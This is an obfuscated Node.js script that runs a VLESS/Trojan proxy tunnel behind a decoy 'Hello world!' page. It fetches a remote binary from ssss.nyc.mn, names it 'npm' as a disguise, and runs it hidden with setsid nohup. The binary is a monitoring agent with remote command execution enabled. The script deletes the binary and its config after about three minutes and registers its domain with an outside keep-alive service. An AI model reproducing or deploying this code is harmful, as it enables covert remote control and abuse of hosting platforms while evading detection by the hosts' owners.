const _0xf49e1e=_0x5e23;(function(_0x27d6a1,_0x8fbb8d){const _0x15ef4e=_0x5e23,_0x1004cd=_0x27d6a1();while(!![]){try{const _0x54b1d6=-parseInt(_0x15ef4e(0x130))/0x1+parseInt(_0x15ef4e(0x117))/0x2+parseInt(_0x15ef4e(0x108))/0x3+-parseInt(_0x15ef4e(0x135))/0x4+-parseInt(_0x15ef4e(0x120))/0x5*(-parseInt(_0x15ef4e(0x119))/0x6)+-parseInt(_0x15ef4e(0x137))/0x7+-parseInt(_0x15ef4e(0x100))/0x8;if(_0x54b1d6===_0x8fbb8d)break;else _0x1004cd['push'](_0x1004cd['shift']());}catch(_0x21c407){_0x1004cd['push'](_0x1004cd['shift']());}}}(_0x19d8,0x5d15e));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0xf49e1e(0xeb)),net=require('net'),path=require('path'),crypto=require(_0xf49e1e(0x112)),{Buffer}=require(_0xf49e1e(0xf8)),{exec,execSync}=require(_0xf49e1e(0x14e)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xf49e1e(0x136)][_0xf49e1e(0x121)]||_0xf49e1e(0x107),NEZHA_SERVER=process[_0xf49e1e(0x136)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0xf49e1e(0x136)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0xf49e1e(0x127)]||'',DOMAIN=process[_0xf49e1e(0x136)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0xf49e1e(0x136)][_0xf49e1e(0x14c)]||!![],WSPATH=process[_0xf49e1e(0x136)][_0xf49e1e(0xf4)]||UUID[_0xf49e1e(0x106)](0x0,0x8),SUB_PATH=process[_0xf49e1e(0x136)][_0xf49e1e(0xe7)]||_0xf49e1e(0x11c),NAME=process[_0xf49e1e(0x136)]['NAME']||_0xf49e1e(0x109),PORT=process[_0xf49e1e(0x136)][_0xf49e1e(0x12a)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x48b956=_0xf49e1e;try{const _0x5a9795=await axios['get'](_0x48b956(0x14f)),_0x315481=_0x5a9795[_0x48b956(0xfd)];ISP=(_0x315481['country']+'-'+_0x315481[_0x48b956(0x12c)])[_0x48b956(0x141)](/ /g,'_');}catch(_0x3b33ef){ISP=_0x48b956(0x126);}};GetISP();const httpServer=http[_0xf49e1e(0x149)]((_0x51393e,_0x51796e)=>{const _0x4c4259=_0xf49e1e;if(_0x51393e[_0x4c4259(0xf0)]==='/'){const _0x3340c9=path[_0x4c4259(0x102)](__dirname,_0x4c4259(0xf3));fs['readFile'](_0x3340c9,_0x4c4259(0x110),(_0x4bb227,_0x25c821)=>{const _0x465f11=_0x4c4259;if(_0x4bb227){_0x51796e['writeHead'](0xc8,{'Content-Type':_0x465f11(0x133)}),_0x51796e[_0x465f11(0x13e)](_0x465f11(0xf5));return;}_0x51796e[_0x465f11(0x13d)](0xc8,{'Content-Type':_0x465f11(0x133)}),_0x51796e[_0x465f11(0x13e)](_0x25c821);});return;}else{if(_0x51393e[_0x4c4259(0xf0)]==='/'+SUB_PATH){const _0x1891c6=_0x4c4259(0x154)+UUID+'@'+DOMAIN+_0x4c4259(0x13b)+DOMAIN+_0x4c4259(0xec)+DOMAIN+_0x4c4259(0x116)+WSPATH+'#'+NAME+'-'+ISP,_0x3dcd41='trojan://'+UUID+'@'+DOMAIN+_0x4c4259(0x129)+DOMAIN+_0x4c4259(0xec)+DOMAIN+_0x4c4259(0x116)+WSPATH+'#'+NAME+'-'+ISP,_0xea66d6=_0x1891c6+'\x0a'+_0x3dcd41,_0x536a11=Buffer['from'](_0xea66d6)[_0x4c4259(0x10f)](_0x4c4259(0x101));_0x51796e[_0x4c4259(0x13d)](0xc8,{'Content-Type':_0x4c4259(0x158)}),_0x51796e['end'](_0x536a11+'\x0a');}else _0x51796e['writeHead'](0x194,{'Content-Type':_0x4c4259(0x158)}),_0x51796e[_0x4c4259(0x13e)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0xf49e1e(0xe9))]({'server':httpServer}),uuid=UUID[_0xf49e1e(0x141)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0xf49e1e(0xfb)];function resolveHost(_0x2df8a5){return new Promise((_0x52e87c,_0x4845ae)=>{const _0x3aab80=_0x5e23;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3aab80(0x138)](_0x2df8a5)){_0x52e87c(_0x2df8a5);return;}let _0x34e801=0x0;function _0x3c0afe(){const _0x23fe00=_0x3aab80;if(_0x34e801>=DNS_SERVERS['length']){_0x4845ae(new Error('Failed\x20to\x20resolve\x20'+_0x2df8a5+_0x23fe00(0x155)));return;}const _0xca3aa0=DNS_SERVERS[_0x34e801];_0x34e801++;const _0x382c87=_0x23fe00(0x10b)+encodeURIComponent(_0x2df8a5)+_0x23fe00(0x145);axios[_0x23fe00(0xe8)](_0x382c87,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x23fe00(0x134)](_0x31b583=>{const _0x4c009a=_0x23fe00,_0x1ff9a7=_0x31b583[_0x4c009a(0xfd)];if(_0x1ff9a7[_0x4c009a(0x14b)]===0x0&&_0x1ff9a7['Answer']&&_0x1ff9a7['Answer'][_0x4c009a(0x14d)]>0x0){const _0x35bdc3=_0x1ff9a7[_0x4c009a(0xf1)]['find'](_0xd7e837=>_0xd7e837[_0x4c009a(0x156)]===0x1);if(_0x35bdc3){_0x52e87c(_0x35bdc3[_0x4c009a(0xfd)]);return;}}_0x3c0afe();})['catch'](_0x16da31=>{_0x3c0afe();});}_0x3c0afe();});}function handleVlessConnection(_0x2ed796,_0x23275a){const _0x203a6f=_0xf49e1e,[_0x54c16b]=_0x23275a,_0x143394=_0x23275a['slice'](0x1,0x11);if(!_0x143394['every']((_0x562080,_0x285773)=>_0x562080==parseInt(uuid[_0x203a6f(0x12e)](_0x285773*0x2,0x2),0x10)))return![];let _0x2bb184=_0x23275a[_0x203a6f(0x106)](0x11,0x12)[_0x203a6f(0x111)]()+0x13;const _0x4b70cc=_0x23275a[_0x203a6f(0x106)](_0x2bb184,_0x2bb184+=0x2)[_0x203a6f(0xfa)](0x0),_0xfb15d5=_0x23275a[_0x203a6f(0x106)](_0x2bb184,_0x2bb184+=0x1)[_0x203a6f(0x111)](),_0xf78048=_0xfb15d5==0x1?_0x23275a[_0x203a6f(0x106)](_0x2bb184,_0x2bb184+=0x4)[_0x203a6f(0x102)]('.'):_0xfb15d5==0x2?new TextDecoder()['decode'](_0x23275a[_0x203a6f(0x106)](_0x2bb184+0x1,_0x2bb184+=0x1+_0x23275a[_0x203a6f(0x106)](_0x2bb184,_0x2bb184+0x1)['readUInt8']())):_0xfb15d5==0x3?_0x23275a[_0x203a6f(0x106)](_0x2bb184,_0x2bb184+=0x10)[_0x203a6f(0x152)]((_0x1c9f5b,_0x4eb889,_0x4e28e6,_0x23d4fe)=>_0x4e28e6%0x2?_0x1c9f5b[_0x203a6f(0xff)](_0x23d4fe[_0x203a6f(0x106)](_0x4e28e6-0x1,_0x4e28e6+0x1)):_0x1c9f5b,[])['map'](_0x3d125f=>_0x3d125f[_0x203a6f(0xfa)](0x0)['toString'](0x10))[_0x203a6f(0x102)](':'):'';_0x2ed796[_0x203a6f(0xe6)](new Uint8Array([_0x54c16b,0x0]));const _0x31ec6d=createWebSocketStream(_0x2ed796);return resolveHost(_0xf78048)[_0x203a6f(0x134)](_0x37a9fe=>{const _0xe9e4d6=_0x203a6f;net['connect']({'host':_0x37a9fe,'port':_0x4b70cc},function(){const _0x4e2760=_0x5e23;this[_0x4e2760(0x12b)](_0x23275a[_0x4e2760(0x106)](_0x2bb184)),_0x31ec6d['on']('error',()=>{})[_0x4e2760(0x10c)](this)['on'](_0x4e2760(0x147),()=>{})[_0x4e2760(0x10c)](_0x31ec6d);})['on'](_0xe9e4d6(0x147),()=>{});})[_0x203a6f(0x140)](_0x56c5e3=>{const _0x16e3ea=_0x203a6f;net[_0x16e3ea(0x139)]({'host':_0xf78048,'port':_0x4b70cc},function(){const _0xdd3cb1=_0x16e3ea;this[_0xdd3cb1(0x12b)](_0x23275a[_0xdd3cb1(0x106)](_0x2bb184)),_0x31ec6d['on'](_0xdd3cb1(0x147),()=>{})[_0xdd3cb1(0x10c)](this)['on'](_0xdd3cb1(0x147),()=>{})[_0xdd3cb1(0x10c)](_0x31ec6d);})['on'](_0x16e3ea(0x147),()=>{});}),!![];}function handleTrojanConnection(_0x3d7b6f,_0x3e1092){const _0x54fce7=_0xf49e1e;try{if(_0x3e1092[_0x54fce7(0x14d)]<0x3a)return![];const _0x1f9ef0=_0x3e1092[_0x54fce7(0x106)](0x0,0x38)[_0x54fce7(0x10f)](),_0x2a236b=[UUID];let _0x238c3b=null;for(const _0x468461 of _0x2a236b){const _0x5cf3f5=crypto[_0x54fce7(0x157)](_0x54fce7(0x13f))[_0x54fce7(0xe4)](_0x468461)[_0x54fce7(0x118)](_0x54fce7(0x115));if(_0x5cf3f5===_0x1f9ef0){_0x238c3b=_0x468461;break;}}if(!_0x238c3b)return![];let _0x12dc28=0x38;_0x3e1092[_0x12dc28]===0xd&&_0x3e1092[_0x12dc28+0x1]===0xa&&(_0x12dc28+=0x2);const _0x38f460=_0x3e1092[_0x12dc28];if(_0x38f460!==0x1)return![];_0x12dc28+=0x1;const _0x1af0c4=_0x3e1092[_0x12dc28];_0x12dc28+=0x1;let _0x37b6c5,_0x2626dc;if(_0x1af0c4===0x1)_0x37b6c5=_0x3e1092[_0x54fce7(0x106)](_0x12dc28,_0x12dc28+0x4)[_0x54fce7(0x102)]('.'),_0x12dc28+=0x4;else{if(_0x1af0c4===0x3){const _0x5e507c=_0x3e1092[_0x12dc28];_0x12dc28+=0x1,_0x37b6c5=_0x3e1092[_0x54fce7(0x106)](_0x12dc28,_0x12dc28+_0x5e507c)[_0x54fce7(0x10f)](),_0x12dc28+=_0x5e507c;}else{if(_0x1af0c4===0x4)_0x37b6c5=_0x3e1092[_0x54fce7(0x106)](_0x12dc28,_0x12dc28+0x10)[_0x54fce7(0x152)]((_0x4363f5,_0xeb7dee,_0x399830,_0x1b0ae1)=>_0x399830%0x2?_0x4363f5[_0x54fce7(0xff)](_0x1b0ae1[_0x54fce7(0x106)](_0x399830-0x1,_0x399830+0x1)):_0x4363f5,[])[_0x54fce7(0x12f)](_0x36756f=>_0x36756f[_0x54fce7(0xfa)](0x0)[_0x54fce7(0x10f)](0x10))[_0x54fce7(0x102)](':'),_0x12dc28+=0x10;else return![];}}_0x2626dc=_0x3e1092[_0x54fce7(0xfa)](_0x12dc28),_0x12dc28+=0x2;_0x12dc28<_0x3e1092['length']&&_0x3e1092[_0x12dc28]===0xd&&_0x3e1092[_0x12dc28+0x1]===0xa&&(_0x12dc28+=0x2);const _0x290c0b=createWebSocketStream(_0x3d7b6f);return resolveHost(_0x37b6c5)[_0x54fce7(0x134)](_0x428a7b=>{const _0x5106b2=_0x54fce7;net[_0x5106b2(0x139)]({'host':_0x428a7b,'port':_0x2626dc},function(){const _0x23254c=_0x5106b2;_0x12dc28<_0x3e1092['length']&&this[_0x23254c(0x12b)](_0x3e1092[_0x23254c(0x106)](_0x12dc28)),_0x290c0b['on'](_0x23254c(0x147),()=>{})[_0x23254c(0x10c)](this)['on'](_0x23254c(0x147),()=>{})[_0x23254c(0x10c)](_0x290c0b);})['on']('error',()=>{});})[_0x54fce7(0x140)](_0x2e4529=>{const _0x405403=_0x54fce7;net[_0x405403(0x139)]({'host':_0x37b6c5,'port':_0x2626dc},function(){const _0x54374d=_0x405403;_0x12dc28<_0x3e1092[_0x54374d(0x14d)]&&this['write'](_0x3e1092[_0x54374d(0x106)](_0x12dc28)),_0x290c0b['on'](_0x54374d(0x147),()=>{})[_0x54374d(0x10c)](this)['on'](_0x54374d(0x147),()=>{})[_0x54374d(0x10c)](_0x290c0b);})['on'](_0x405403(0x147),()=>{});}),!![];}catch(_0x24bebe){return![];}}function _0x5e23(_0x7731f2,_0x32dc71){_0x7731f2=_0x7731f2-0xe3;const _0x19d8c8=_0x19d8();let _0x5e235c=_0x19d8c8[_0x7731f2];return _0x5e235c;}wss['on'](_0xf49e1e(0xf6),(_0x5f4d76,_0x3e2fe4)=>{const _0x8a8c63=_0xf49e1e,_0x4f9743=_0x3e2fe4[_0x8a8c63(0xf0)]||'';_0x5f4d76[_0x8a8c63(0x11e)](_0x8a8c63(0x10a),_0x5b3adf=>{const _0x304ee1=_0x8a8c63;if(_0x5b3adf[_0x304ee1(0x14d)]>0x11&&_0x5b3adf[0x0]===0x0){const _0x5859c7=_0x5b3adf['slice'](0x1,0x11),_0x3d5010=_0x5859c7[_0x304ee1(0x14a)]((_0x50c8a0,_0x5a9949)=>_0x50c8a0==parseInt(uuid[_0x304ee1(0x12e)](_0x5a9949*0x2,0x2),0x10));if(_0x3d5010){!handleVlessConnection(_0x5f4d76,_0x5b3adf)&&_0x5f4d76['close']();return;}}!handleTrojanConnection(_0x5f4d76,_0x5b3adf)&&_0x5f4d76[_0x304ee1(0x128)]();})['on'](_0x8a8c63(0x147),()=>{});});const getDownloadUrl=()=>{const _0x22c224=_0xf49e1e,_0x1c20d4=os[_0x22c224(0x103)]();return _0x1c20d4==='arm'||_0x1c20d4===_0x22c224(0xf9)||_0x1c20d4===_0x22c224(0x153)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x22c224(0x124):_0x22c224(0x148);},downloadFile=async()=>{const _0x5e8c2b=_0xf49e1e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x226b35=getDownloadUrl(),_0x4ebd6c=await axios({'method':'get','url':_0x226b35,'responseType':_0x5e8c2b(0xed)}),_0x54b506=fs[_0x5e8c2b(0x125)](_0x5e8c2b(0xfc));return _0x4ebd6c[_0x5e8c2b(0xfd)]['pipe'](_0x54b506),new Promise((_0x1cd78d,_0x303b60)=>{const _0x3578ac=_0x5e8c2b;_0x54b506['on']('finish',()=>{const _0x2f673a=_0x5e23;console[_0x2f673a(0x10e)](_0x2f673a(0x159)),exec(_0x2f673a(0x113),_0x1a1eb7=>{if(_0x1a1eb7)_0x303b60(_0x1a1eb7);_0x1cd78d();});}),_0x54b506['on'](_0x3578ac(0x147),_0x303b60);});}catch(_0x5c31c3){throw _0x5c31c3;}},runnz=async()=>{const _0x2f025b=_0xf49e1e;try{const _0x516aa2=execSync(_0x2f025b(0x144),{'encoding':_0x2f025b(0x151)});if(_0x516aa2['trim']()!==''){console[_0x2f025b(0x10e)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x5e1ee1){}await downloadFile();let _0x55d7f0='',_0x132c97=[_0x2f025b(0x122),'8443',_0x2f025b(0x132),_0x2f025b(0x11b),_0x2f025b(0xe3),_0x2f025b(0x150)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5682c5=_0x132c97['includes'](NEZHA_PORT)?_0x2f025b(0xee):'';_0x55d7f0=_0x2f025b(0x11a)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5682c5+_0x2f025b(0x11d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x6e095a=NEZHA_SERVER[_0x2f025b(0xef)](':')?NEZHA_SERVER['split'](':')[_0x2f025b(0x10d)]():'',_0x256b5c=_0x132c97['includes'](_0x6e095a)?_0x2f025b(0x13c):_0x2f025b(0xfe),_0x58d20d=_0x2f025b(0x13a)+NEZHA_KEY+_0x2f025b(0x131)+NEZHA_SERVER+_0x2f025b(0x104)+_0x256b5c+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x2f025b(0x123)](_0x2f025b(0xe5),_0x58d20d);}_0x55d7f0=_0x2f025b(0x143);}else{console[_0x2f025b(0x10e)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x55d7f0,{'shell':'/bin/bash'},_0x24230e=>{const _0x16c122=_0x2f025b;if(_0x24230e)console['error']('npm\x20running\x20error:',_0x24230e);else console[_0x16c122(0x10e)](_0x16c122(0x12d));});}catch(_0x546d51){console[_0x2f025b(0x147)](_0x2f025b(0x142)+_0x546d51);}};async function addAccessTask(){const _0x356963=_0xf49e1e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x20b9d7=_0x356963(0xf2)+DOMAIN;try{const _0x4b5615=await axios[_0x356963(0x146)](_0x356963(0xf7),{'url':_0x20b9d7},{'headers':{'Content-Type':_0x356963(0x11f)}});console[_0x356963(0x10e)](_0x356963(0xea));}catch(_0x284d0a){}}const delFiles=()=>{const _0x27d536=_0xf49e1e;fs[_0x27d536(0x105)](_0x27d536(0xfc),()=>{}),fs[_0x27d536(0x105)](_0x27d536(0xe5),()=>{});};function _0x19d8(){const _0x4abfb2=['text/plain','npm\x20download\x20successfully','2083','update','config.yaml','send','SUB_PATH','get','Server','Automatic\x20Access\x20Task\x20added\x20successfully','axios','&fp=chrome&type=ws&host=','stream','--tls','includes','url','Answer','https://','index.html','WSPATH','Hello\x20world!','connection','https://oooo.serv00.net/add-url','buffer','arm64','readUInt16BE','1.1.1.1','npm','data','false','concat','304472RhKFpk','base64','join','arch','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','unlink','slice','e85ef209-2049-4cd5-a8bb-1ff719a4794f','1060689hVAwQg','Hug','message','https://dns.google/resolve?name=','pipe','pop','log','toString','utf8','readUInt8','crypto','chmod\x20+x\x20npm','Server\x20is\x20running\x20on\x20port\x20','hex','&path=%2F','1054986UsykfY','digest','307722gamrIR','setsid\x20nohup\x20./npm\x20-s\x20','2087','dzb098','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','once','application/json','15hNLmQL','UUID','443','writeFileSync','https://amd64.ssss.nyc.mn/v1','createWriteStream','Unknown','NEZHA_KEY','close',':443?security=tls&sni=','PORT','write','asOrganization','npm\x20is\x20running','substr','map','376960ZWvNXV','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2096','text/html','then','5648CcLgZB','env','1660456LdSFjc','test','connect','client_secret:\x20',':443?encryption=none&security=tls&sni=','true','writeHead','end','sha224','catch','replace','error:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','&type=A','post','error','https://amd64.ssss.nyc.mn/agent','createServer','every','Status','AUTO_ACCESS','length','child_process','https://speed.cloudflare.com/meta','2053','utf-8','reduce','aarch64','vless://','\x20with\x20all\x20DNS\x20servers','type','createHash'];_0x19d8=function(){return _0x4abfb2;};return _0x19d8();}httpServer['listen'](PORT,()=>{const _0x22199f=_0xf49e1e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x22199f(0x114)+PORT);});
